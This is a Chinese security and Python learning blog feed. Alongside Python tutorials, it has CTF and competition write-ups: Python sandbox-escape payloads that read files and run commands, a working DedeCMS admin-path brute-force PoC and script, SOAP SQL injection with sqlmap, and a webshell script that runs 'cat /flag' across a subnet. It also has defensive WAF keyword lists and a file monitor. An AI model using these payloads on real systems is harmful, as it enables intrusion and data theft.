因为描述符是一个类属性，所有所有的类属性具有最高优先级。其次是实现了__get__()和__set__()方法的描述符，即数据描述符。否则就默认为局部对象的__dict__的值，也就是说它可以是一个实例属性。接着是非数据描述符，函数就是非数据描述符，非数据描述符的作用只是当实例属性值不存在时提供一个值而已。最后当一个实例的__dict__中找不到某个属性时，才去调用__getattr__() 例子例子1用一个描述符禁止对属性进行访问或赋值的请求 12345class DevNull1(object): def __get__(self, obj, type = None): pass def __set__(self, obj, val): pass 建立一个类，使用这个描述符，并给它赋值显示其值 可以看到，并没有显示出’bar’这个值 例子212345class DevNull2(object): def __get__(self, obj, type = None): print 'Accessing attribute...' def __set__(self, obj, val): print 'Setting attribute:%r' % (val) 输出结果为： 可以看到在赋值的时候调用了__set__()方法，在访问属性的时候调用了__get__()方法 例子3在描述符所在的类中添加一个占位符 1234567class DevNull3(object): def __init__(self, name = None): self.name = name def __get__(self, obj, typ = None): print 'Accessing [%s]... ignoring' % (self.name) def __set__(self, obj, val): print 'Accessing %r to [%s]... ignoring' % (val, self.name) 输出结果为： 可以看到结果体现了之前提到的优先级问题，实例属性c3.foo赋值为’bar’，但是由于数据描述符比实例属性优先级高，所赋的值被隐藏或者覆盖了 例子4例子3的输出不是很好理解优先级的问题，我们再用一个直白的例子来说明。前提：实例属性比非数据描述符的优先级要高 可以看到优先显示的是我们给实例属性bar.foo赋的值，因为它比非数据描述符的优先级高]]></content>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python学习之return self]]></title>
    <url>%2F2018%2F09%2F07%2FPython%E5%AD%A6%E4%B9%A0%E4%B9%8Breturn-self%2F</url>
    <content type="text"><![CDATA[在学习python的过程中遇到return self的用法，一直没理解这是什么意思，返回自身？遂在网上找资料学习一波 引言首先在官方文档是这样说的： 1Returning self from a method simply means that your method returns a reference to the instance object on which it was called. This can sometimes be seen in use with object oriented APIs that are designed as a fluent interface that encourages method cascading. 简而言之就是： 1从方法返回self就是方法返回对调用它的实例对象的引用 例子123456789class Foo(object): def __init__(self): self.num = 0 def bar(self): self.num += 1 return selff = Foo()print type(f.bar()) 可以看到，return self返回的是类的实例 1234567891011class Foo(object): def __init__(self): self.num = 0 def bar(self): self.num += 1 return self f = Foo()f.bar().bar()print f.num 成功打印出结果 那么如果我们给它返回一个none值呢，可以看到结果报错，也只打印了1。以为第一次+1后return None就抛出了一个异常终止代码执行 联系至此，书上常用的代码： 12def __iter__(self): return self 是一种将对象声明为迭代器的方式 还有重载方法： 123def __iadd__(self, other): .... return self 当重载_i*__()方法时必须返回self]]></content>
      <tags>
        <tag>编程</tag>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[通过一道CTF学习Python沙盒逃逸]]></title>
    <url>%2F2018%2F09%2F06%2F%E9%80%9A%E8%BF%87%E4%B8%80%E9%81%93CTF%E5%AD%A6%E4%B9%A0Python%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%2F</url>
    <content type="text"><![CDATA[之前网鼎杯出了一道python沙盒逃逸的题目，那次有事情没能打那次比赛（虽然打了也做不出来）。正好最近在深入学习python，学习一波python沙盒逃逸 题目题目是一道计算器，并且提示只允许四则运算，给出了一段过滤的正则表达式 1^[0-9.]+\s*[*+-/]\s*[0-9.]+ 查看robots.txt的时候会报错： 123456Traceback (most recent call last):File "/usr/local/lib/python2.7/dist-packages/tornado/web.py", line 1520, in _executeresult = self.prepare()File "/usr/local/lib/python2.7/dist-packages/tornado/web.py", line 2266, in prepareraise HTTPError(self._status_code)HTTPError: HTTP 404: Not Found 这里就可以看出是一道python web 分析首先分析下这个正则： 以整数或小数开头，接着匹配零个或多个任意空格字符，然后是运算符+-*/，接着又是匹配零个或多个空格字符，最后是整数或小数 结构为数字[]运算符[]数字，看似没问题，但是仔细分析发现这个正则有问题 [*+-/]中的’ - ‘有范围的含义，所以这个正则我们可以理解为匹配零次或多次’ + ‘到’ / ‘中间的字符，其中包括： 其次，正则末尾是’ + ‘结尾，结尾可以不是数字，造成逃逸 poc11+1,().__class__.__bases__[0].__subclasses__()[40]('/flag').read() 常用的poc还有： 1234写任意文件().__class__.__bases__[0].__subclasses__()[40]('/tmp', 'w').write('123')执行任意命令().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]['eval']('__import__("os").popen("ls").read()' ) Python沙箱逃逸的其他方法相关函数及方法os.system() os.popen() 类似的方法或者函数还有 1234567891011commands.getstatusoutput('ls') commands.getoutput('ls')commands.getstatus('1.txt')subprocess.call('ls', shell=True) subprocess.Popen('ls', shell=True)pty.spawn('ls')execfile('1.py')timeit.timeit("__import__('os').system('ls')",number=1)eval('__import__("os").system("ls")')exec('__import__("os").system("ls")')print platform.popen('ls').read() 需要注意的是使用时需要导入相应的模块 点到为止（因为再往下就是pwn了，看不懂TAT） 绕过编码可以用各种编码进行绕过字符明文检测，比如base64或rot_13等等 例如： 12a = __import__("pbzznaqf".decode('rot_13'))print a.getoutput('ifconfig') 倒序当某些字符明文检测时，可以利用倒序来进行绕过，如： 12s = &quot;gifoncfi&quot;s = s [::-1] reload方法当模块被删除，可以利用reload方法重新导入 但是当reload方法被删除，那么我们可以利用imp模块 12import impimp.reload(__builtin__) 这样就可以reload模块了 直接执行相应代码当我们的sys、os、reload都没kill掉的时候，如果知道相应路径，还是可以引入模块 123execfile('/usr/lib/python2.7/os.py')system('ls')getcwd() 当execfile函数被禁止，可以使用文件操作打开相应文件然后导入，使用exec来执行命令 防御可以用以下代码完成对敏感包的检测 1234567import recode = open('code.py').read()pattern = re.compile('import\s+(os|commands|subprocess|sys)')match = re.search(pattern,code)if match: print "forbidden module import detected" raise Exception]]></content>
      <tags>
        <tag>Python</tag>
        <tag>沙盒</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python学习之闭包]]></title>
    <url>%2F2018%2F09%2F06%2FPython%E5%AD%A6%E4%B9%A0%E4%B9%8B%E9%97%AD%E5%8C%85%2F</url>
    <content type="text"><![CDATA[最近在《Python核心编程第二版》上看到了闭包这一概念，理解得不够清楚，深入学习一下 定义维基百科)上对闭包的解释如下： 在计算机科学中，闭包（英语：Closure），又称词法闭包（Lexical Closure）或函数闭包（function closures），是引用了自由变量的函数。这个被引用的自由变量将和这个函数一同存在，即使已经离开了创造它的环境也不例外。所以，有另一种说法认为闭包是由函数和与其相关的引用环境组合而成的实体。闭包在运行时可以有多个实例，不同的引用环境和相同的函数组合可以产生不同的实例。 例子例子1:12345678def counter(start_at = 0): count = [start_at] def incr(): count[0] += 1 return count[0] return incrcount = counter(5)count() 运行结果为: 将上面这段代码改为函数嵌套形式： 12345678def counter(start_at = 0): count = [start_at] def incr(): count[0] += 1 return count[0] incr()count = counter(5)print count 但是运行结果为none： 例子2:1234567def print_msg(): msg = "test" def printer(): print(msg) return printeranother = print_msg()another() 运行结果为： 让我们将这段代码改为函数嵌套形式： 123456def print_msg(): msg = "test" def printer(): print(msg) printer() print_msg() 可以看到，运行结果和闭包形式运行结果一致： 对比以上两个例子四段代码，我们可以发现，在闭包中，内部函数并没有被显式调用，而是作为返回值被返回了。正常情况下，函数中的局部变量仅仅在函数执行期间可被访问，一旦函数被执行，函数内的局部变量将变得不再可用。可是我们发现在counter()和print_msg()函数执行完后，再调用count()和another()函数时，本该失效的局部变量被重新访问了。这就是闭包的作用，可在函数外访问函数内的局部变量 这涉及到一个作用域的问题 作用域作用域即某个变量可被访问的范围 例子1：123456str1 = 'The global out of the func'def foo(): str2 = 'The local in the func' print (str1) print (str2)foo() 运行结果为： 例子2:12345str1 = 'The global out of the func'def foo(): str2 = 'The local in the func'print (str1)print (str2) 运行结果为： 原理为了更好的解释原理，我们以一个简单的例子来说明： 1234567def add(x): def result(y): return x + y return resultadd1 = add(6)add1(7)add1(8) 运行结果为： 让我们访问函数的__closure__属性试试： 可以看到返回了一个由cell对象组成的元祖对象，因为这是个闭包。cell对象的cell_contents属性就是闭包中的自由变量 这就是函数之外能访问函数内局部变量的原因 结论在闭包中，即使脱离了函数本身的作用范围，局部变量还可以被访问得到。而在函数嵌套中却不可以 可是闭包的本质也是一个函数，闭包使局部变量的值始终保存在内存里 使用闭包的原因是为了避免使用全局变量 当对象只有一个方法时，最好使用闭包]]></content>
      <tags>
        <tag>编程</tag>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python学习之with]]></title>
    <url>%2F2018%2F09%2F06%2FPython%E5%AD%A6%E4%B9%A0%E4%B9%8Bwith%2F</url>
    <content type="text"><![CDATA[之前入门python的时候没有遇到过with语句，最近在看《python核心编程》遇到了，感觉比较有意思，学习一波 概念with语句在2.5版本时引入，值得注意的是在2.5版本中需要通过导入from __future__ import with_statement才能使用with语句，从2.6开始可以缺省。 语法with语句的用法可以用在文件操作 其语法格式如下： 12with open('文件名', '读写模式') as i: 执行操作 相当于 123f = open('文件名', '读写模式')执行操作f.close() 也可以改为try…finally语句 12345file = open('文件名', '读写模式')try: 执行操作finally: file.close() 也就是说with可以自动关闭打开的文件管道，并且这是使用了上下文管理器的用法 例子上下文管理器的概念网上也有，并且说的模糊不清，我们可以用代码实现一个上下文管理器 1234567891011121314151617class Test(object): def __init__(self): print "实例化一个对象" def if_exist(self): print "对象还没退出" def __enter__(self): print "获取该对象" return self def __exit__(self, *args): print "退出该对象"with Test() as t: t.if_exist() 执行结果为： 所以上下文管理器用法的执行顺序就有了。 那么如果在with语句里抛出了异常呢？ 123456789101112131415161718class Test(object): def __init__(self): print "实例化一个对象" def if_exist(self): print "对象还没退出" def __enter__(self): print "获取该对象" return self def __exit__(self, *args): print "退出该对象"with Test() as t: 1/0 t.if_exist() 运行结果为 那么如果使__exit__()方法返回True呢 12345678910111213141516171819class Test(object): def __init__(self): print "实例化一个对象" def if_exist(self): print "对象还没退出" def __enter__(self): print "获取该对象" return self def __exit__(self, *args): print "退出该对象" return Truewith Test() as t: 1/0 t.if_exist() 运行结果为： 因此，上面的抛出异常例子原理是：抛出了异常，在异常处退出，然后将异常传入__exit__()方法中，由于此方法返回False，所以会重新抛出异常 简而言之，上下文管理器的作用是：可以更好的控制对象在不同区间的特性，并且可以使用with语句代替try…except方法，使得代码更加简洁，主要的使用场景是访问资源，可以保证过程中即使抛出异常或者发生错误程序也会执行相应操作，释放访问资源]]></content>
      <tags>
        <tag>编程</tag>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[dedecms通配符爆♂后台]]></title>
    <url>%2F2018%2F07%2F26%2Fdedecms%E9%80%9A%E9%85%8D%E7%AC%A6%E7%88%86%E2%99%82%E5%90%8E%E5%8F%B0%2F</url>
    <content type="text"><![CDATA[最近的巅峰极客遇到一道dedecms的题，没做出来，后面看了表哥的wp，利用的就是利用通配符爆后台，复现一波 漏洞成因我的代码审计渣的一批，下学期开始搞审计，漏洞原因就先看看表哥们的审计，摘自先知社区 首先看核心文件common.inc.php 大概148行左右 1234if($_FILES)&#123; require_once(DEDEINC.&apos;/uploadsafe.inc.php&apos;);&#125; uploadsafe.inc.php 12345678910111213141516171819202122232425262728293031323334if( preg_match(&apos;#^(cfg_|GLOBALS)#&apos;, $_key) )&#123; exit(&apos;Request var not allow for uploadsafe!&apos;);&#125;$$_key = $_FILES[$_key][&apos;tmp_name&apos;]; //获取temp_name $&#123;$_key.&apos;_name&apos;&#125; = $_FILES[$_key][&apos;name&apos;];$&#123;$_key.&apos;_type&apos;&#125; = $_FILES[$_key][&apos;type&apos;] = preg_replace(&apos;#[^0-9a-z\./]#i&apos;, &apos;&apos;, $_FILES[$_key][&apos;type&apos;]);$&#123;$_key.&apos;_size&apos;&#125; = $_FILES[$_key][&apos;size&apos;] = preg_replace(&apos;#[^0-9]#&apos;,&apos;&apos;,$_FILES[$_key][&apos;size&apos;]);if(!empty($&#123;$_key.&apos;_name&apos;&#125;) &amp;&amp; (preg_match(&quot;#\.(&quot;.$cfg_not_allowall.&quot;)$#i&quot;,$&#123;$_key.&apos;_name&apos;&#125;) || !preg_match(&quot;#\.#&quot;, $&#123;$_key.&apos;_name&apos;&#125;)) )&#123; if(!defined(&apos;DEDEADMIN&apos;)) &#123; exit(&apos;Not Admin Upload filetype not allow !&apos;); &#125;&#125;if(empty($&#123;$_key.&apos;_size&apos;&#125;))&#123; $&#123;$_key.&apos;_size&apos;&#125; = @filesize($$_key);&#125;$imtypes = array( &quot;image/pjpeg&quot;, &quot;image/jpeg&quot;, &quot;image/gif&quot;, &quot;image/png&quot;, &quot;image/xpng&quot;, &quot;image/wbmp&quot;, &quot;image/bmp&quot;);if(in_array(strtolower(trim($&#123;$_key.&apos;_type&apos;&#125;)), $imtypes))&#123; $image_dd = @getimagesize($$_key); //问题就在这里，获取文件的size，获取不到说明不是图片或者图片不存在，不存就exit upload.... ,利用这个逻辑猜目录的前提是目录内有图片格式的文件。 if (!is_array($image_dd)) &#123; exit(&apos;Upload filetype not allow !&apos;); &#125;&#125;...... 注意$$_key这一句，变量$key取自于$_FILE，由于$_FILE可控自然$key也可控,此处理论上是可以覆盖任意变量，但是前面有个正则判断不能出现cfg_|GLOBALS。(但是应该还可以覆盖其他变量此处感觉还可以深挖) 本人出发点是找个可以利用&lt;&lt;通配符猜解后台目录，所以只要$$_key参数可控就可以达到目的。 12345678if(!empty($&#123;$_key.&apos;_name&apos;&#125;) &amp;&amp; (preg_match(&quot;#\.(&quot;.$cfg_not_allowall.&quot;)$#i&quot;,$&#123;$_key.&apos;_name&apos;&#125;) || !preg_match(&quot;#\.#&quot;, $&#123;$_key.&apos;_name&apos;&#125;)) ) &#123; if(!defined(&apos;DEDEADMIN&apos;)) &#123; exit(&apos;Not Admin Upload filetype not allow !&apos;); &#125; &#125; 这个判断只需要设置$&#123;$_key.&apos;_name&apos;&#125; 的值为0或者1.jpg 含点“ . ” 既可以绕过 如：_FILES[b4dboy][name]=1.jpg 最后关键的一点就是要让文件存在还和不存在返回不同的内容就要控制type参数了 当目录文件存在的时候 返回正常页面。当不存在的时候返回：Upload filetype not allow ! 环境123系统：windows 8容器：PHPStudy环境：dedecms 5.7 安装完如图所示： 后台为“backdoor/”（本来为”dede/“，为了演示，我将后台名修改了，实战或者ctf中也经常遇到这种后台名被修改的情况） 漏洞复现POC：1234URL: http://127.0.0.1/DedeCMS-V5.7-UTF8-SP2/uploads/tags.phpPOST: dopost=save&amp;_FILES[b4dboy][tmp_name]=./后台名&lt;/images/admin_top_logo.gif&amp;_FILES[b4dboy][name]=0&amp;_FILES[b4dboy][size]=0&amp;_FILES[b4dboy][type]=image/gif 这个过程跟SQL注入基于错误的盲注一样，在POC的后台名处一位一位的进行猜解，当后台名的某一位存在时返回正常页面 当后台名的某一位不存在时返回Upload filetype not allow ! 附上红日的自动化爆破脚本 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556#!/usr/bin/env python'''/* * author = Mochazz * team = 红日安全团队 * env = pyton3 * */'''import requestsimport itertoolscharacters = "abcdefghijklmnopqrstuvwxyz0123456789_!#"back_dir = ""flag = 0url = "http://192.168.1.9/tags.php"data = &#123; "_FILES[mochazz][tmp_name]" : "./&#123;p&#125;&lt;&lt;/images/adminico.gif", "_FILES[mochazz][name]" : 0, "_FILES[mochazz][size]" : 0, "_FILES[mochazz][type]" : "image/gif"&#125;for num in range(1,7): if flag: break for pre in itertools.permutations(characters,num): pre = ''.join(list(pre)) data["_FILES[mochazz][tmp_name]"] = data["_FILES[mochazz][tmp_name]"].format(p=pre) print("testing",pre) r = requests.post(url,data=data) if "Upload filetype not allow !" not in r.text and r.status_code == 200: flag = 1 back_dir = pre data["_FILES[mochazz][tmp_name]"] = "./&#123;p&#125;&lt;&lt;/images/adminico.gif" break else: data["_FILES[mochazz][tmp_name]"] = "./&#123;p&#125;&lt;&lt;/images/adminico.gif"print("[+] 前缀为：",back_dir)flag = 0for i in range(30): if flag: break for ch in characters: if ch == characters[-1]: flag = 1 break data["_FILES[mochazz][tmp_name]"] = data["_FILES[mochazz][tmp_name]"].format(p=back_dir+ch) r = requests.post(url, data=data) if "Upload filetype not allow !" not in r.text and r.status_code == 200: back_dir += ch print("[+] ",back_dir) data["_FILES[mochazz][tmp_name]"] = "./&#123;p&#125;&lt;&lt;/images/adminico.gif" break else: data["_FILES[mochazz][tmp_name]"] = "./&#123;p&#125;&lt;&lt;/images/adminico.gif"print("后台地址为：",back_dir) 注意通配符的原因，此漏洞仅在Windows下有效 通杀全版本dedecms]]></content>
      <tags>
        <tag>漏洞复现</tag>
        <tag>dedecms</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[捡肥皂--SOAP注入]]></title>
    <url>%2F2018%2F07%2F20%2F%E6%8D%A1%E8%82%A5%E7%9A%82-SOAP%E6%B3%A8%E5%85%A5%2F</url>
    <content type="text"><![CDATA[在看赛总推荐的《黑客攻防技术宝典Web实战篇》时，看到有SOAP服务，并且了解到有SOAP注入，学习下 SOAP服务以下定义摘自维基百科： SOAP即简单对象访问协议，是交换数据的一种协议规范，使用在计算机网络web服务中，交换带结构信息。使用SOAP的目的是为了简化网页服务器从XML数据库中提取数据时，节约格式化页面的时间，以及不同应用程序之间按照HTTP通信协议，遵从XML格式执行资料交换，使其抽象于语言实现、平台和硬件。目前SOAP 1.1是业界共同标准，属于第二代XML协定 SOAP 是基于 XML 的简易协议，可使应用程序在 HTTP 之上进行信息交换。或者更简单地说：SOAP 是用于访问网络服务的协议。可以把它认为是一个中间件，起着沟通桥梁的作用。因为当所有的服务都使用同一种标准，那么沟通就比较容易了 SOAP协议具有以下特点： SOAP 是一种通信协议 SOAP 用于应用程序之间的通信 SOAP 是一种用于发送消息的格式 SOAP 被设计用来通过因特网进行通信 SOAP 独立于平台 SOAP 独立于语言 SOAP 基于 XML SOAP 很简单并可扩展 SOAP 允许您绕过防火墙 SOAP 将被作为 W3C 标准来发展 SOAP是微软.net架构的关键元素 SOAP进行SQL注入生成payload可以利用shodan和zoomeye或者google，搜索关键字asmx，因为webserver是微软推出的soap框架，其后缀为asmx 我们这里利用awvs给出的漏洞靶场进行测试：http://testaspnet.vulnweb.com/acuservice/service.asmx?WSDL 使用awvs的web services下的web services scanner进行扫描并生成payload 可以看到有四个高危SQL注入 然后进入一个漏洞详情，并展开view http headers 此时payload就成功生成了 利用将上面得到的request字段另存为一个文本文件，注意将注入位置部分改为星号*，然后利用sqlmap进行自动化注入（因为我还不会手动测试soap sql注入） 1sqlmap -r 1.txt --dms 常见的soap攻击不止有SQL注入，还有命令注入、XML注入、SOAP操作欺、DDOS攻击等 另外附上刚刚看到的云影实验室的一篇paper，探索基于.NET下实现一句话木马之asmx篇]]></content>
      <tags>
        <tag>owasp top 10</tag>
        <tag>SQL注入</tag>
        <tag>SOAP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[线下赛AWD模式初探]]></title>
    <url>%2F2018%2F06%2F26%2F%E7%BA%BF%E4%B8%8B%E8%B5%9BAWD%E6%A8%A1%E5%BC%8F%E5%88%9D%E6%8E%A2%2F</url>
    <content type="text"><![CDATA[防御先做好防御工作，否则一开始被打穿后面心态就容易崩 修改密码ssh密码修改 1sudo passwd user mysql密码修改 1mysql&gt; SET PASSWORD FOR &apos;user&apos;@&apos;localhost&apos; = PASSWORD(&apos;newpass&apos;); web后台密码修改 直接在后台管理页面进行修改 当然有些情况是比赛不允许修改后台口令，会将修改后台口令视为宕机，还要被扣分 备份可以用Winscp、FileZilla之类的工具连接下载/var/www/html/下的文件做好备份 删除后门有些比赛主办方会在服务器预留后门，这时可以把备份目录用D盾之类的工具扫描一下，或者下载相同的cms来进行目录对比。有的话立刻删除，并且利用这个后门攻击其他服务器（很可能后门密码相同或者类似，可以猜解） 参考表哥的脚本，修改其中的地址、shell路径和密码即可 12345678910111213141516171819202122232425#coding=utf-8import requestsurl="http://192.168.71."url1=""shell="/Upload/index.php"passwd="abcde10db05bd4f6a24c94d7edde441d18545" port="80"payload = &#123;passwd: 'system(\'cat /flag\');'&#125;f=open("webshelllist.txt","w") f1=open("firstround_flag.txt","w")for i in [51,52,53,11,12,13,21,22,23,31,32,33,41,42,43,71,72,73,81,82,83]: url1=url+str(i)+":"+port+shell try: res=requests.post(url1,payload,timeout=1) if res.status_code == requests.codes.ok: print url1+" connect shell sucess,flag is "+res.text print &gt;&gt;f1,url1+" connect shell sucess,flag is "+res.text print &gt;&gt;f,url1+","+passwd else: print "shell 404" except: print url1+" connect shell fail" f.close()f1.close() 部署waf一般SQL注入之类的漏洞不会有过滤，可以部署waf来拖延对方时间。同理，可以在对方部署waf前利用sqlmap来跑 上传漏洞也是简单的黑名单过滤，但是可以通过部署waf来删除常规木马，拖延对方的时间 waf可以用安全狗linux版或者柠檬师傅发的: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162&lt;?php$WAF_log = '/var/tmp/web_log_';$Upload_dir = '/var/tmp/upload/';error_reporting(0);function waf() &#123; global $Upload_dir; if (!function_exists('getallheaders')) &#123; function getallheaders() &#123; foreach ($_SERVER as $name =&gt; $value) &#123; if (substr($name, 0, 5) == 'HTTP_') &#123; $headers[str_replace(' ', '-', ucwords(strtolower(str_replace('_', ' ', substr($name, 5)))))] = $value; &#125; &#125; unset($header['Accept']); return $headers; &#125; &#125; $get = $_GET; $get2 = $_SERVER['QUERY_STRING']; $post = $_POST; $post2 = @file_get_contents('php://input'); $cookie = $_COOKIE; $header = getallheaders(); $header['url'] = $_SERVER['REQUEST_METHOD'] . ' ' . 'http://' . $_SERVER['SERVER_NAME'] . ':' . $_SERVER["SERVER_PORT"] . $_SERVER["REQUEST_URI"]; $files = $_FILES; $ip = $_SERVER["REMOTE_ADDR"]; $method = $_SERVER['REQUEST_METHOD']; $filepath = $_SERVER["SCRIPT_NAME"]; if (!empty($files)) &#123; foreach ($_FILES as $key =&gt; $value) &#123; $files[$key]['content'] = file_get_contents($_FILES[$key]['tmp_name']); move_uploaded_file($_FILES[$key]['tmp_name'], $Upload_dir . $_FILES[$key]["name"] . '.' . time()); file_put_contents($_FILES[$key]['tmp_name'], "lemon"); &#125; &#125; unset($header['Accept']); $input = array("Header" =&gt; $header, "Get" =&gt; $get, "Get2" =&gt; $get2, "Cookie" =&gt; $cookie, "Post" =&gt; $post, "Post2" =&gt; $post2, "File" =&gt; $files); logging($input); $pattern = "/select|insert|update|delete|and|or|\'|\/\*|\*|\.\.\/|\.\/|union|into|load_file|outfile|dumpfile|sub|hex"; $pattern .= "|file_put_contents|fwrite|curl|system|eval|assert|file_get_contents"; $pattern .= "|passthru|exec|system|chroot|scandir|chgrp|chown|shell_exec|proc_open|proc_get_status|popen|ini_alter|ini_restore"; $pattern .= "|`|dl|openlog|syslog|readlink|symlink|popepassthru|stream_socket_server|assert|pcntl_exec/i";&#125;function logging($var) &#123; global $WAF_log; $tmp = "\n[" . date('y-m-d H:i:s') . "]\n"; foreach ($var as $k =&gt; $v) &#123; if (!empty($v)) &#123; $tmp .= $k . " : " . print_r($v, true); &#125; &#125; file_put_contents($WAF_log . date('H', time()), $tmp . "\n\r", FILE_APPEND);&#125;waf();?&gt; 在PHP文件里include这个waf即可，要比安全狗麻烦点 如果想整站防注，就在网站的一个公用文件中，如数据库链接文件config.inc.php中！ 添加require_once(‘waf.php’);来调用本代码 常用php系统添加文件 123456PHPCMS V9 \phpcms\base.phpPHPWIND8.7 \data\sql_config.phpDEDECMS5.7 \data\common.inc.phpDiscuzX2 \config\config_global.phpWordpress \wp-config.phpMetinfo \include\head.php 文件监控，会将新文件或者当文件被修改时立即恢复 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181# -*- coding: utf-8 -*-# @Author: Nearg1e -- 2016-06-30 10:08:35 --0v0--# v demo 0.21 修改了备份的webshell会自己坑自己的情况# todo: windows下不支持中文目录#use: python file_check.py ./import osimport hashlibimport shutilimport ntpathimport timeCWD = os.getcwd()FILE_MD5_DICT = &#123;&#125; # 文件MD5字典ORIGIN_FILE_LIST = []# 特殊文件路径字符串Special_path_str = 'drops_JWI96TY7ZKNMQPDRUOSG0FLH41A3C5EXVB82'bakstring = 'bak_EAR1IBM0JT9HZ75WU4Y3Q8KLPCX26NDFOGVS'logstring = 'log_WMY4RVTLAJFB28960SC3KZX7EUP1IHOQN5GD'webshellstring = 'webshell_WMY4RVTLAJFB28960SC3KZX7EUP1IHOQN5GD'difffile = 'diff_UMTGPJO17F82K35Z0LEDA6QB9WH4IYRXVSCN'Special_string = 'drops_log' # 免死金牌UNICODE_ENCODING = "utf-8"INVALID_UNICODE_CHAR_FORMAT = r"\?%02x"# 文件路径字典spec_base_path = os.path.realpath(os.path.join(CWD, Special_path_str))Special_path = &#123; 'bak' : os.path.realpath(os.path.join(spec_base_path, bakstring)), 'log' : os.path.realpath(os.path.join(spec_base_path, logstring)), 'webshell' : os.path.realpath(os.path.join(spec_base_path, webshellstring)), 'difffile' : os.path.realpath(os.path.join(spec_base_path, difffile)),&#125;def isListLike(value): return isinstance(value, (list, tuple, set))# 获取Unicode编码def getUnicode(value, encoding=None, noneToNull=False): if noneToNull and value is None: return NULL if isListLike(value): value = list(getUnicode(_, encoding, noneToNull) for _ in value) return value if isinstance(value, unicode): return value elif isinstance(value, basestring): while True: try: return unicode(value, encoding or UNICODE_ENCODING) except UnicodeDecodeError, ex: try: return unicode(value, UNICODE_ENCODING) except: value = value[:ex.start] + "".join(INVALID_UNICODE_CHAR_FORMAT % ord(_) for _ in value[ex.start:ex.end]) + value[ex.end:] else: try: return unicode(value) except UnicodeDecodeError: return unicode(str(value), errors="ignore")# 目录创建def mkdir_p(path): import errno try: os.makedirs(path) except OSError as exc: if exc.errno == errno.EEXIST and os.path.isdir(path): pass else: raise# 获取当前所有文件路径def getfilelist(cwd): filelist = [] for root,subdirs, files in os.walk(cwd): for filepath in files: originalfile = os.path.join(root, filepath) if Special_path_str not in originalfile: filelist.append(originalfile) return filelist# 计算机文件MD5值def calcMD5(filepath): try: with open(filepath,'rb') as f: md5obj = hashlib.md5() md5obj.update(f.read()) hash = md5obj.hexdigest() return hash except Exception, e: print u'[!] getmd5_error : ' + getUnicode(filepath) print getUnicode(e) try: ORIGIN_FILE_LIST.remove(filepath) FILE_MD5_DICT.pop(filepath, None) except KeyError, e: pass# 获取所有文件MD5def getfilemd5dict(filelist = []): filemd5dict = &#123;&#125; for ori_file in filelist: if Special_path_str not in ori_file: md5 = calcMD5(os.path.realpath(ori_file)) if md5: filemd5dict[ori_file] = md5 return filemd5dict# 备份所有文件def backup_file(filelist=[]): # if len(os.listdir(Special_path['bak'])) == 0: for filepath in filelist: if Special_path_str not in filepath: shutil.copy2(filepath, Special_path['bak'])if __name__ == '__main__': print u'---------start------------' for value in Special_path: mkdir_p(Special_path[value]) # 获取所有文件路径，并获取所有文件的MD5，同时备份所有文件 ORIGIN_FILE_LIST = getfilelist(CWD) FILE_MD5_DICT = getfilemd5dict(ORIGIN_FILE_LIST) backup_file(ORIGIN_FILE_LIST) # TODO 备份文件可能会产生重名BUG print u'[*] pre work end!' while True: file_list = getfilelist(CWD) # 移除新上传文件 diff_file_list = list(set(file_list) ^ set(ORIGIN_FILE_LIST)) if len(diff_file_list) != 0: # import pdb;pdb.set_trace() for filepath in diff_file_list: try: f = open(filepath, 'r').read() except Exception, e: break if Special_string not in f: try: print u'[*] webshell find : ' + getUnicode(filepath) shutil.move(filepath, os.path.join(Special_path['webshell'], ntpath.basename(filepath) + '.txt')) except Exception as e: print u'[!] move webshell error, "%s" maybe is webshell.'%getUnicode(filepath) try: f = open(os.path.join(Special_path['log'], 'log.txt'), 'a') f.write('newfile: ' + getUnicode(filepath) + ' : ' + str(time.ctime()) + '\n') f.close() except Exception as e: print u'[-] log error : file move error: ' + getUnicode(e) # 防止任意文件被修改,还原被修改文件 md5_dict = getfilemd5dict(ORIGIN_FILE_LIST) for filekey in md5_dict: if md5_dict[filekey] != FILE_MD5_DICT[filekey]: try: f = open(filekey, 'r').read() except Exception, e: break if Special_string not in f: try: print u'[*] file had be change : ' + getUnicode(filekey) shutil.move(filekey, os.path.join(Special_path['difffile'], ntpath.basename(filekey) + '.txt')) shutil.move(os.path.join(Special_path['bak'], ntpath.basename(filekey)), filekey) except Exception as e: print u'[!] move webshell error, "%s" maybe is webshell.'%getUnicode(filekey) try: f = open(os.path.join(Special_path['log'], 'log.txt'), 'a') f.write('diff_file: ' + getUnicode(filekey) + ' : ' + getUnicode(time.ctime()) + '\n') f.close() except Exception as e: print u'[-] log error : done_diff: ' + getUnicode(filekey) pass time.sleep(2) # print '[*] ' + getUnicode(time.ctime()) 流量分析可以在机器上利用tcpdump进行流量抓取 1tcpdump -s 0 port xxxx -w 1.pcap 追踪下tcp流，溯源 日志分析php脚本 12345678910111213&lt;?phpdate_default_timezone_set('Asia/Shanghai');$ip = $_SERVER["REMOTE_ADDR"]; //记录访问者的ip$filename = $_SERVER['PHP_SELF']; //访问者要访问的文件名$parameter = $_SERVER["QUERY_STRING"]; //访问者要请求的参数$time = date('Y-m-d H:i:s',time()); //访问时间$logadd = '来访时间：'.$time.'--&gt;'.'访问链接：'.'http://'.$ip.$filename.'?'.$parameter."\r\n";// log记录$fh = fopen("log.txt", "a");fwrite($fh, $logadd);fclose($fh);?&gt; 一些日志分析工具 LogForensics 腾讯实验室 https://security.tencent.com/index.php/opensource/detail/15 北风飘然@金乌网络安全实验室 http://www.freebuf.com/sectool/126698.html 网络ID为piaox的安全从业人员： http://www.freebuf.com/sectool/110644.html 网络ID：SecSky 